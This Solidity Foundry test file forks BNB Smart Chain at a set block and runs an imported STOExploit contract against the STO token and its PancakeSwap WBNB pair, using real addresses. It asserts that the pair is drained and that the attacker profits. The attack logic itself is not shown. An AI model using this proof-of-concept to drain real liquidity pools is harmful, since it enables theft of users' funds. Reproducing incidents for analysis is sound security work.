// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/STOExploit.sol";

interface IPancakePairView {
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract STOExploitTest is Test {
    string constant BSC_RPC = "https://bsc.nodereal.io";
    uint256 constant FORK_BLOCK = 82890985;

    IWBNB  constant WBNB  = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISTO   constant STO   = ISTO(0xFE33EB082B2374ecd9Fb550f833DB88CaD8d084B);
    address constant PAIR = 0x7c404aD6149BC69e07eCd534B9F4243Ef289bD00;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;

    STOExploit public exploit;
    address public attacker;

    function setUp() public {
        vm.createSelectFork(BSC_RPC, FORK_BLOCK);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        vm.prank(attacker);
        exploit = new STOExploit();
    }

    function _getReserves() internal view returns (uint112 r0, uint112 r1) {
        (r0, r1,) = IPancakePairView(PAIR).getReserves();
    }

    function test_exploit() public {
        (uint112 r0Before, uint112 r1Before) = _getReserves();
        uint256 pendingBurn = STO.pendingBurnFromSell();

        emit log_string("============ PRE-ATTACK STATE");
        emit log_named_decimal_uint("Pair WBNB reserve", uint256(r0Before), 18);
        emit log_named_decimal_uint("Pair STO reserve",  uint256(r1Before), 18);
        emit log_named_decimal_uint("pendingBurnFromSell", pendingBurn, 18);
        emit log_named_decimal_uint("Moolah WBNB",       WBNB.balanceOf(MOOLAH), 18);
        emit log_named_uint("buyEnabled",  STO.buyEnabled() ? 1 : 0);
        emit log_named_uint("sellEnabled", STO.sellEnabled() ? 1 : 0);
        emit log_named_uint("burnEnabled", STO.burnEnabled() ? 1 : 0);

        vm.prank(attacker);
        exploit.attack();

        (uint112 r0After, uint112 r1After) = _getReserves();
        uint256 exploitWbnb = WBNB.balanceOf(address(exploit));
        uint256 exploitBnb  = address(exploit).balance;

        emit log_string("============ POST-ATTACK STATE");
        emit log_named_decimal_uint("Pair WBNB reserve", uint256(r0After), 18);
        emit log_named_decimal_uint("Pair STO reserve",  uint256(r1After), 18);
        emit log_named_decimal_uint("Exploit WBNB bal",  exploitWbnb, 18);
        emit log_named_decimal_uint("Exploit BNB bal",   exploitBnb, 18);

        uint256 profit = exploitWbnb + exploitBnb;
        uint256 drained = uint256(r0Before) > uint256(r0After)
            ? uint256(r0Before) - uint256(r0After)
            : 0;

        emit log_string("============ RESULTS");
        emit log_named_decimal_uint("WBNB drained from pair", drained, 18);
        emit log_named_decimal_uint("Net profit (WBNB+BNB)",  profit, 18);

        assertGt(profit, 0, "No profit");
        assertGt(drained, 0, "Pair not drained");

        emit log_string("============ EXPLOIT SUCCESS");
    }
}
